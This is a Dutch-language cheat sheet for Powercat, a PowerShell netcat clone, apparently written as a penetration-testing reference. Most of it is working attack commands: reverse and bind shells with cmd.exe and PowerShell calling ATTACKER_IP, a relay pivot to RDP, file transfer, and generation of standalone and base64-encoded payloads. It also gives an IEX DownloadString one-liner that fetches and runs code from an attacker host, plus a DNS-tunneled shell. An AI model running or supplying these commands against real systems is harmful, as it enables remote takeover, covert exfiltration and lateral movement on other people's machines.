# Powercat — PowerShell netcat (TCP/UDP, relay, file transfer, payload generatie)
# Volledige netcat implementatie in PowerShell met extra features zoals relay en DNS
#
# === Syntax ===
# powercat -c HOST -p PORT -e cmd.exe          (reverse shell)
# powercat -l -p PORT -e cmd.exe               (bind shell)
#
# === Belangrijkste opties ===
# -c HOST        Connect naar host (client mode)
# -l             Listen mode (server)
# -p PORT        Poortnummer
# -e PROG        Programma uitvoeren (cmd.exe, powershell.exe)
# -ep            Execute PowerShell (handiger dan -e powershell.exe)
# -r RELAY       Relay naar andere host (tcp:HOST:PORT, dns:HOST:PORT)
# -g             Genereer PowerShell payload (stand-alone script)
# -ge            Genereer encoded payload (base64)
# -t TIMEOUT     Timeout in seconden
# -i INPUT       Input vanuit string
# -o OUTPUT      Output naar string
# -of FILE       Output naar bestand
# -d             Disconnect na EOF
# -dns DOMAIN    DNS mode (tunneling)
# -dnsft         DNS file transfer mode
# -u             UDP in plaats van TCP
#
# === Voorbeelden ===

# Reverse shell naar attacker
powercat -c ATTACKER_IP -p 443 -e cmd.exe

# Reverse PowerShell shell
powercat -c ATTACKER_IP -p 443 -ep

# Bind shell (luistert op doelwit)
powercat -l -p 4444 -e cmd.exe

# Relay — port forward (pivot)
powercat -l -p 443 -r tcp:TARGET:3389

# File transfer — ontvangen
powercat -l -p 4444 -of C:\temp\file.exe

# File transfer — versturen
powercat -c TARGET -p 4444 -i C:\temp\file.exe

# Stand-alone payload genereren
powercat -c ATTACKER_IP -p 443 -ep -g > payload.ps1

# Encoded payload genereren (voor one-liner)
powercat -c ATTACKER_IP -p 443 -ep -ge > encoded.txt

# One-liner download en execute
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1'); powercat -c ATTACKER_IP -p 443 -ep

# DNS tunneling mode
powercat -c ATTACKER_IP -p 53 -dns DOMAIN -e cmd.exe

